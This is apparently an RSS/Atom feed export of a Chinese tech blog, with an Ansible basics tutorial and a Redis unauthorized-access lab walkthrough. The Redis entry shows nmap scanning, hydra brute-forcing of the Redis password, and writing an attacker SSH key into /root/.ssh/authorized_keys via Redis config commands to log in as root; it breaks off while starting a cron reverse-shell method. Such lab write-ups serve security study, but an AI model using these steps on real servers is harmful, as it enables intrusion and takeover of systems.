href="https://developer.aliyun.com/article/1158325">https://developer.aliyun.com/article/1158325</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Prometheus-Grafana&quot;&gt;&lt;a href=&quot;#Prometheus-Grafana&quot; class=&quot;headerlink&quot; title=&quot;Prometheus + Grafana&quot;&gt;&lt;/a&gt;Prometheus + Grafana&lt;/h1&gt;&lt;p&gt;基于</summary>
      
    
    
    
    
    <category term="服务器运维" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Ansible 基础教程</title>
    <link href="http://example.com/2024/05/28/Ansible-%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    <id>http://example.com/2024/05/28/Ansible-%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</id>
    <published>2024-05-28T05:34:46.000Z</published>
    <updated>2024-06-18T05:44:23.619Z</updated>
    
    <content type="html"><![CDATA[<p>Ansible 是一款 IT 自动化工具。主要应用场景有配置系统、软件部署、持续发布及不停服平滑滚动更新的高级任务编排。</p><p>Ansible 本身非常简单易用，同时注重安全和可靠性，以最小化变动为特色，使用 OpenSSH 实现数据传输 ( 如果有需要的话也可以使用其它传输模式或者 pull 模式 )，其语言设计非常利于人类阅读，即使是针对不刚接触 Ansible 的新手来讲亦是如此。</p><h1 id="Ansible安装配置"><a href="#Ansible安装配置" class="headerlink" title="Ansible安装配置"></a>Ansible安装配置</h1><h2 id="1-安装-Ansible"><a href="#1-安装-Ansible" class="headerlink" title="1. 安装 Ansible"></a>1. 安装 Ansible</h2><p><strong>apt 安装</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install software-properties-common</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-add-repository --<span class="hljs-built_in">yes</span> --update ppa:ansible/ansible</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install ansible</span><br></code></pre></td></tr></table></figure><p><strong>pip 安装</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo pip <span class="hljs-keyword">install</span> ansible<br></code></pre></td></tr></table></figure><h2 id="2-基本概念"><a href="#2-基本概念" class="headerlink" title="2. 基本概念"></a>2. 基本概念</h2><ul><li><strong>控制节点</strong>：运行Ansible命令的计算机。</li><li><strong>受管节点</strong>：被Ansible管理的计算机。</li><li><strong>清单（Inventory）</strong>：定义受管节点的列表，通常存储在<code>/etc/ansible/hosts</code>文件中。</li><li><strong>模块（Modules）</strong>：执行任务的单位，Ansible内置了许多模块用于不同的管理任务。</li><li><strong>剧本（Playbooks）</strong>：包含任务的YAML文件，用于定义一组配置或编排任务。</li><li><strong>角色（Roles）</strong>：用于组织和重用Ansible代码的层次结构。</li></ul><h2 id="3-配置清单文件"><a href="#3-配置清单文件" class="headerlink" title="3.配置清单文件"></a>3.配置清单文件</h2><p>编写 Ansible 的 <code>hosts</code> 文件定义受管节点（主机）。这个文件可以在 <code>/etc/ansible/hosts</code> 路径下找到</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 直接定义主机</span><br>green.example.com<br>blue.example.com<br>192.168.100.1<br>192.168.100.10<br><span class="hljs-comment"># 分组的主机</span><br><span class="hljs-section">[webservers]</span><br>alpha.example.org<br>beta.example.org<br><br><br><span class="hljs-comment"># 使用模式匹配来定义一组主机，例如 www[001:006].example.com 表示从 www001.example.com 到 www006.example.com 的主机</span><br><span class="hljs-comment"># 范围模式</span><br>www<span class="hljs-section">[001:006]</span>.example.com<br><br></code></pre></td></tr></table></figure><p> 可以为单个主机或整个组指定变量：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 为单个主机指定变量</span><br>alpha.example.org <span class="hljs-attr">ansible_user</span>=admin ansible_port=<span class="hljs-number">2222</span><br><br><span class="hljs-comment"># 为整个组指定变量</span><br><span class="hljs-section">[webservers:vars]</span><br><span class="hljs-attr">ansible_user</span>=webadmin<br><span class="hljs-attr">ansible_port</span>=<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>为成功连接受控主机，需要配置ssh密钥</p><p>1.在控制节点生成 SSH 密钥对</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa -b 4096 -C &quot;your_email@example.com&quot;<br></code></pre></td></tr></table></figure><p>将会在 <code>~/.ssh</code> 目录下生成 <code>id_rsa</code>（私钥）和 <code>id_rsa.pub</code>（公钥）文件。</p><p>2.将公钥复制到目标主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 连接受控主机并将控制节点的公钥写入authorized_keys</span><br>ssh root@alpha.example.org<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;您的公钥内容&gt;&quot;</span> &gt;&gt; ~/.ssh/authorized_keys <span class="hljs-comment"># 注意：用户名root 非root用户需要在上面的hosts文件中指定登录名</span><br></code></pre></td></tr></table></figure><h2 id="4-Ansible使用"><a href="#4-Ansible使用" class="headerlink" title="4.Ansible使用"></a>4.Ansible使用</h2><h4 id="列出所有主机"><a href="#列出所有主机" class="headerlink" title="列出所有主机"></a>列出所有主机</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada">列出所有在清单文件中定义的主机：<br>ansible <span class="hljs-keyword">all</span> <span class="hljs-comment">--list</span><br># 列出指定组中的主机：<br>ansible webservers <span class="hljs-comment">--list-hosts</span><br></code></pre></td></tr></table></figure><h4 id="Ping-所有主机"><a href="#Ping-所有主机" class="headerlink" title="Ping 所有主机"></a>Ping 所有主机</h4><p>使用 <code>ping</code> 模块测试所有主机的连通性：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ansible <span class="hljs-keyword">all</span> -m ping<br></code></pre></td></tr></table></figure><h4 id="在主机上执行命令"><a href="#在主机上执行命令" class="headerlink" title="在主机上执行命令"></a>在主机上执行命令</h4><p>在指定的主机组上使用 <code>command</code> 模块执行命令（例如查看磁盘空间）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible webservers -m <span class="hljs-built_in">command</span> -a <span class="hljs-string">&quot;df -h&quot;</span><br></code></pre></td></tr></table></figure><h5 id="在主机上执行-Shell-命令"><a href="#在主机上执行-Shell-命令" class="headerlink" title="在主机上执行 Shell 命令"></a>在主机上执行 Shell 命令</h5><p>在指定的主机组上使用 <code>shell</code> 模块执行命令（例如列出 <code>/tmp</code> 目录）：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">ansible webservers -m <span class="hljs-built_in">shell</span> -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;ls -l /tmp&quot;</span><br></code></pre></td></tr></table></figure><h4 id="运行剧本"><a href="#运行剧本" class="headerlink" title="运行剧本"></a>运行剧本</h4><p>使用 <code>ansible-playbook</code> 命令运行剧本：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ansible-playbook playbook.yml<br></code></pre></td></tr></table></figure><h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>使用 <code>-b</code> 或 <code>--become</code> 提升权限（例如使用 <code>sudo</code>）：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ansible webservers -<span class="hljs-selector-tag">b</span> -m command -<span class="hljs-selector-tag">a</span> <span class="hljs-string">&quot;df -h&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Anisble-Modules-常用模块"><a href="#Anisble-Modules-常用模块" class="headerlink" title="Anisble Modules  常用模块"></a>Anisble Modules  常用模块</h3><p>ansible使用“模块”来完成大部分的任务。模块可以完成安装软件，复制文件，使用模板等功能。</p><table><thead><tr><th>模块</th><th>功能描述</th><th>示例</th></tr></thead><tbody><tr><td><code>ping</code></td><td>测试主机是否可达</td><td><code>ansible all -m ping</code></td></tr><tr><td><code>command</code></td><td>在远程主机上执行命令（不通过 shell）</td><td><code>ansible webservers -m command -a &quot;df -h&quot;</code></td></tr><tr><td><code>shell</code></td><td>在远程主机上执行 shell 命令</td><td><code>ansible webservers -m shell -a &quot;ls -l /tmp&quot;</code></td></tr><tr><td><code>raw</code></td><td>在远程主机上直接执行命令，不通过 Ansible 模块子系统</td><td><code>ansible all -m raw -a &quot;python --version&quot;</code></td></tr><tr><td><code>copy</code></td><td>将本地文件复制到远程主机</td><td><code>ansible webservers -m copy -a &quot;src=/path/to/local/file dest=/path/to/remote/file&quot;</code></td></tr><tr><td><code>fetch</code></td><td>从远程主机上提取文件</td><td><code>ansible webservers -m fetch -a &quot;src=/path/to/remote/file dest=/path/to/local/file&quot;</code></td></tr><tr><td><code>file</code></td><td>设置文件属性，如权限、所有权等</td><td><code>ansible webservers -m file -a &quot;path=/path/to/file mode=0644&quot;</code></td></tr><tr><td><code>service</code></td><td>管理服务，如启动、停止、重启等</td><td><code>ansible webservers -m service -a &quot;name=nginx state=started&quot;</code></td></tr><tr><td><code>apt</code></td><td>使用 apt 包管理器安装软件包（适用于 Debian 系系统）</td><td><code>ansible webservers -m apt -a &quot;name=nginx state=present&quot;</code></td></tr><tr><td><code>yum</code></td><td>使用 yum 包管理器安装软件包（适用于 Red Hat 系系统）</td><td><code>ansible webservers -m yum -a &quot;name=httpd state=present&quot;</code></td></tr><tr><td><code>user</code></td><td>管理用户和组</td><td><code>ansible webservers -m user -a &quot;name=johndoe state=present&quot;</code></td></tr><tr><td><code>group</code></td><td>管理组</td><td><code>ansible webservers -m group -a &quot;name=admin state=present&quot;</code></td></tr><tr><td><code>cron</code></td><td>管理 cron 作业</td><td><code>ansible webservers -m cron -a &quot;name=&#39;backup&#39; minute=&#39;0&#39; hour=&#39;2&#39; job=&#39;/path/to/backup.sh&#39;&quot;</code></td></tr><tr><td><code>get_url</code></td><td>从 URL 下载文件</td><td><code>ansible webservers -m get_url -a &quot;url=http://example.com/file dest=/tmp/file&quot;</code></td></tr><tr><td><code>setup</code></td><td>收集远程主机的详细信息</td><td><code>ansible all -m setup</code></td></tr><tr><td><code>template</code></td><td>使用 Jinja2 模板渲染文件并部署到远程主机</td><td><code>ansible webservers -m template -a &quot;src=/path/to/template.j2 dest=/path/to/remote/file&quot;</code></td></tr><tr><td><code>yum_repository</code></td><td>管理 YUM 仓库</td><td><code>ansible webservers -m yum_repository -a &quot;name=epel description=EPEL repo baseurl=https://download.fedoraproject.org/pub/epel/7/x86_64/&quot;</code></td></tr><tr><td><code>hostname</code></td><td>设置远程主机的主机名</td><td><code>ansible webservers -m hostname -a &quot;name=newhostname&quot;</code></td></tr><tr><td><code>git</code></td><td>管理 Git 仓库</td><td><code>ansible webservers -m git -a &quot;repo=https://github.com/example/repo.git dest=/path/to/repo&quot;</code></td></tr></tbody></table><h3 id="Ansible-playbook-用法"><a href="#Ansible-playbook-用法" class="headerlink" title="Ansible playbook 用法"></a>Ansible playbook 用法</h3><h4 id="Playbook-结构"><a href="#Playbook-结构" class="headerlink" title="Playbook 结构:"></a>Playbook 结构:</h4><p>一个 playbook 通常包含以下几个部分:</p><ul><li><strong>hosts:</strong> 指定要执行任务的目标主机或主机组。</li><li><strong>become:</strong> 指定是否以超级用户权限执行任务。</li><li><strong>vars:</strong> 定义 playbook 中使用的变量。</li><li><strong>tasks:</strong> 定义要执行的任务列表，每个任务使用模块来完成特定的操作。</li><li><strong>handlers:</strong> 定义 playbook 中事件的响应动作，例如在某个服务重启后执行特定操作。</li></ul><h4 id="Playbook-示例"><a href="#Playbook-示例" class="headerlink" title="Playbook 示例:"></a>Playbook 示例:</h4><p>以下是一个简单的 playbook 示例，用于安装 Nginx 并启动服务:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">web_servers</span><br>  <span class="hljs-attr">become:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">tasks:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">Nginx</span><br>    <span class="hljs-attr">apt:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>      <span class="hljs-attr">state:</span> <span class="hljs-string">present</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Start</span> <span class="hljs-string">Nginx</span> <span class="hljs-string">service</span><br>    <span class="hljs-attr">service:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>      <span class="hljs-attr">state:</span> <span class="hljs-string">started</span><br></code></pre></td></tr></table></figure><p><strong>解释:</strong></p><ul><li>—: YAML 文件开头标识。</li><li>hosts: web_servers: 指定 playbook 应用的目标主机组为 web_servers。</li><li>become: true: 表示以超级用户权限执行任务。</li><li>tasks: 定义任务列表。</li><li>- name: Install Nginx: 任务名称，用于描述该任务的作用。</li><li>apt: 使用 apt 模块安装软件包。</li><li>name: nginx: 要安装的软件包名称为 nginx。</li><li>state: present: 确保软件包已安装。</li><li>- name: Start Nginx service: 启动 Nginx 服务。</li><li>service: 使用 service 模块管理服务。</li><li>name: nginx: 要管理的服务名称为 nginx。</li><li>state: started: 确保服务已启动。</li></ul><h4 id="运行-Playbook"><a href="#运行-Playbook" class="headerlink" title="运行 Playbook:"></a><strong>运行 Playbook:</strong></h4><p><strong>使用以下命令运行 playbook:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">ansible-playbook <span class="hljs-tag">&lt;<span class="hljs-name">playbook_name.yml</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>检查剧本的语法是否正确：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ansible-playbook playbook<span class="hljs-selector-class">.yml</span> <span class="hljs-attr">--syntax-check</span><br></code></pre></td></tr></table></figure><p><strong>查看剧本将会执行的操作，但不实际执行：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ansible-playbook playbook<span class="hljs-selector-class">.yml</span> <span class="hljs-attr">--check</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Ansible 是一款 IT 自动化工具。主要应用场景有配置系统、软件部署、持续发布及不停服平滑滚动更新的高级任务编排。&lt;/p&gt;
&lt;p&gt;Ansible 本身非常简单易用，同时注重安全和可靠性，以最小化变动为特色，使用 OpenSSH 实现数据传输 ( 如果有需要的话也可以使</summary>
      
    
    
    
    
    <category term="Ansible" scheme="http://example.com/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权访问漏洞</title>
    <link href="http://example.com/2024/05/21/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/05/21/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-05-21T11:38:29.000Z</published>
    <updated>2024-05-21T11:53:14.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis安装"><a href="#Redis安装" class="headerlink" title="Redis安装"></a>Redis安装</h1><p>去<a href="http://download.redis.io/releases%E9%80%89%E6%8B%A9%E4%B8%80%E4%B8%AA%E7%89%88%E6%9C%AC%EF%BC%8C%E5%BB%BA%E8%AE%AE4.0.8">http://download.redis.io/releases选择一个版本，建议4.0.8</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /tmp<br>wget http://download.redis.io/releases/redis-7.2.4.tar.gz<br>tar -zvxf redis-7.2.4.tar.gz<br>mv /tmp/redis-7.2.4 /usr/local/redis<br>cd /usr/local/redis<br>make<br>make PREFIX=/usr/local/redis install<br><br>./bin/redis-server&amp; ./redis.conf<br></code></pre></td></tr></table></figure><h1 id="Redis未授权访问-漏洞复现"><a href="#Redis未授权访问-漏洞复现" class="headerlink" title="Redis未授权访问 漏洞复现"></a>Redis未授权访问 漏洞复现</h1><p><strong>一、漏洞描述</strong></p><p>漏洞成因： </p><p>1.Redis 绑定在默认的 6379 端，且没有配置访问控制策略，直接暴露在公网。攻击者可以通过扫描获 取 Redis 访问端口，从而攻击者未经授权也可以访问 Redis。 </p><p>2.未设置密码或者设置弱密码，允许远程登录访问 Redis 服务。攻击者可以直接或者通过密码爆破连 接到 Redis 并进行恶意操作。</p><ol start="3"><li>Redis 使用 root 权限启动。使得攻击者在成功入侵 Redis 服务后，利用 Redis 对服务器开展进一步 的攻击。</li></ol><p><strong>二、漏洞影响版本</strong></p><p>Redis 2.x–5.x</p><p>三、<strong>漏洞危害</strong></p><p>(1) 未授权的访问可能导致敏感信息泄露，攻击者也可以恶意执行命令来清空所有数据和破坏服务</p><p> (2) 如果 Redis 以 root 权限启动，攻击者可以在&#x2F;root&#x2F;.ssh 写入 SSH 公钥文件，直接通过 SSH 登录 目标服务器</p><p> (3) 攻击者可通过 Redis 数据备份功写入可以指定目录的特性，写入后面程序，结合计划任务或者 web 服务 getshell，执行恶意代码和攻击。                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </p><p>当redis服务(6379)端口对外开放且未作密码认证时，任意用户可未授权访问redis服务并操作获取其数据。<br>攻击机：kali 192.168.198.134<br>目标靶机：centos 192.168.198.144</p><h2 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h2><p>首先在攻击机上使用nmap对目标机进行扫描，探测开放的服务与端口。<br>使用全端口扫描，探测存在的服务： </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -p- -sV <span class="hljs-number">192.168.198.144</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/password]                                                                                                                                                               <br>└─$ nmap -p- -sV 192.168.198.144                                                                                                                                                           <br>Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-10 04:18 EDT                                                                                                                            <br>Nmap scan report for 192.168.198.144                                                                                                                                                       <br>Host is up (0.00066s latency).                                                                                                                                                             <br>Not shown: 65532 closed tcp ports (conn-refused)                                                                                                                                           <br>PORT      STATE SERVICE  VERSION                                                                                                                                                           <br>22/tcp    open  ssh      OpenSSH 7.4 (protocol 2.0)                                                                                                                                        <br>6379/tcp  open  redis    Redis key-value store 2.8.17                                                                                                                                      <br>10250/tcp open  ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                                                                                                         <br>                                                                                                                                                                                           <br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                             <br>Nmap done: 1 IP address (1 host up) scanned in 20.72 seconds    <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240510162400812.png" alt="image-20240510162400812"></p><h2 id="2-密码爆破"><a href="#2-密码爆破" class="headerlink" title="2.密码爆破"></a>2.密码爆破</h2><p>使用hydra进行密码爆破</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra  <span class="hljs-number">192.168</span>.<span class="hljs-number">198.144</span> redis -P <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/password/</span>top1000.txt -e ns  -f -o redis.txt<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(kali㉿kali)-[~/<span class="hljs-keyword">password</span>]                                                                                                                                                               <br>└─$ hydra  <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> redis -P /home/kali/<span class="hljs-keyword">password</span>/top1000.txt -e ns  -f -o redis.txt                                                                                                 <br>Hydra v9<span class="hljs-number">.3</span> (c) <span class="hljs-number">2022</span> <span class="hljs-keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> use <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** ignore laws<br> <span class="hljs-keyword">and</span> ethics anyway).                                                                                                                                                                       <br>                                                                                                                                                                                           <br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-10</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>:<span class="hljs-number">21</span>                                                                                                         <br>[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">1001</span> <span class="hljs-keyword">login</span> tries (l:<span class="hljs-number">1</span>/p:<span class="hljs-number">1001</span>), ~<span class="hljs-number">63</span> tries per task                                                                                      <br>[DATA] attacking redis://<span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span>:<span class="hljs-number">6379</span>/                                                                                                                                             <br>[<span class="hljs-number">6379</span>][redis] host: <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span>   <span class="hljs-keyword">password</span>: foobared                                                                                                                                   <br>[STATUS] attack finished <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> (<span class="hljs-keyword">valid</span> pair <span class="hljs-built_in">found</span>)                                                                                                                            <br><span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> <span class="hljs-keyword">valid</span> <span class="hljs-keyword">password</span> <span class="hljs-built_in">found</span>                                                                                                                               <br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-10</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>:<span class="hljs-number">23</span>                                                                                                         <br>                                                                                                                                                                                           <br>┌──(kali㉿kali)-[~/<span class="hljs-keyword">password</span>]                                                                                                                                                               <br>└─$ cat redis.txt                                                                                                                                                                          <br>                                                                                                                                                                                           <br># Hydra v9<span class="hljs-number">.3</span> run at <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-10</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>:<span class="hljs-number">21</span> <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> redis (hydra -P /home/kali/<span class="hljs-keyword">password</span>/top1000.txt -e ns -f -o redis.txt <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> redis)                                    <br>[<span class="hljs-number">6379</span>][redis] host: <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span>   <span class="hljs-keyword">password</span>: foobared   <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240510163642639.png" alt="image-20240510163642639"></p><p>得到密码foobared</p><h2 id="3-远程连接redis"><a href="#3-远程连接redis" class="headerlink" title="3.远程连接redis"></a>3.远程连接redis</h2><p>使用密码连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">192.168.198.144</span> -p <span class="hljs-number">6379</span> -a foobared<br></code></pre></td></tr></table></figure><p>连接成功</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(kali㉿kali)-<span class="hljs-string">[~/password]</span>                                                                                                                                                               <br>└─$ redis-cli -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">198</span>.<span class="hljs-number">144</span> -p <span class="hljs-number">6379</span> -a foobared                                                                                                                                       <br><span class="hljs-number">192.168.198.144:6379</span>&gt;    <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240510170005022.png" alt="image-20240510170005022"></p><h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><h3 id="（1）写-ssh-keygen-公钥登录服务器"><a href="#（1）写-ssh-keygen-公钥登录服务器" class="headerlink" title="（1）写 ssh-keygen 公钥登录服务器"></a>（1）写 ssh-keygen 公钥登录服务器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>ssh-keygen -t rsa<br><span class="hljs-meta prompt_"># </span><span class="language-bash">接着将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合），再把key.txt文件内容写入服务端Redis的缓冲里：</span><br>(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /root/.ssh/key.txt<br>cat /root/.ssh/key.txt | ./redis-cli  -h 192.168.198.144 -p 6379 -a foobared -x set pub<br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用攻击机连接目标机器Redis，设置Redis的备份路径为/root/.ssh/和保存文件名为authorized_keys，并将数据保存在目标服务器硬盘上</span><br>./redis-cli -h 192.168.198.144 -p 6379 -a foobared<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置工作目录为 /root/.ssh</span><br>config set dir /root/.ssh<br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建文件 authorized_keys</span><br>config set dbfilename &quot;authorized_keys&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">保存信息入文件</span><br>save<br><br>ssh -i  /root/.ssh/id_rsa root@192.168.198.144 <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240511011752561.png" alt="image-20240511011752561"></p><p><img src="/img/course/image-20240511015012934.png" alt="image-20240511015012934"></p><h3 id="（2）利用-Redis-写入计划任务"><a href="#（2）利用-Redis-写入计划任务" class="headerlink" title="（2）利用 Redis 写入计划任务"></a>（2）利用 Redis 写入计划任务</h3><p>该攻击利用数据库的特性，通过以下步骤实现反弹 Shell：</p><ol><li><strong>数据插入：</strong> 将计划任务的内容作为数据值（value），并使用任意键值（key）将其插入数据库中。</li><li><strong>路径修改：</strong> 